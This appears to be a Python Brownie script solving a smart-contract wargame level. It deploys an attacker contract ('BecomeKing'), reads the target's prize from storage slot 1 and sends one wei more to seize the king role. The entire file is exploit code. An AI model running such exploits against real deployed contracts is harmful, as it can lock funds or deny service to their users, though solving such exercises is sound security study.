from brownie import web3, config, accounts, BecomeKing, convert

def exploit(target, hacker):
    # Deploy attack
    attack = BecomeKing.deploy({'from': hacker})

    # Figure out current prize (slot 1)
    prize = web3.eth.get_storage_at(target, 1)

    # print information
    print(f'Current prize: {convert.to_uint(prize)}')

    # Execute attack
    attack.sendEther(target, {'from': hacker, 'amount':convert.to_uint(prize)+1})

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    print(f'Attacker address: {hacker}, Target address: {target}')
    exploit(target, hacker)